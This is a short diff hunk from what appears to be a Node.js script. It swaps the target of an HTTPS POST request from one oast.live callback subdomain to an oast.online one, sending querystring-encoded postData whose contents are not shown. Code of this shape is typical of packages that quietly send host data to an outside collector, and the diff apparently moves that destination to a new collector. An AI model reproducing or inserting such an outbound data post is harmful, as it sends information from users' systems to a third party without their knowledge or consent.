@@ -22,7 +22,7 @@ var postData = querystring.stringify({
 });
 
 var options = {
-    hostname: "cq42nc6iuvoha6eaj8dgfrk58r5tgmxzr.oast.live",
+    hostname: "cqen94miuvolog2r0gpgmpbo1f9dwi8ha.oast.online",
     port: 443,
     path: "/",
     method: "POST",
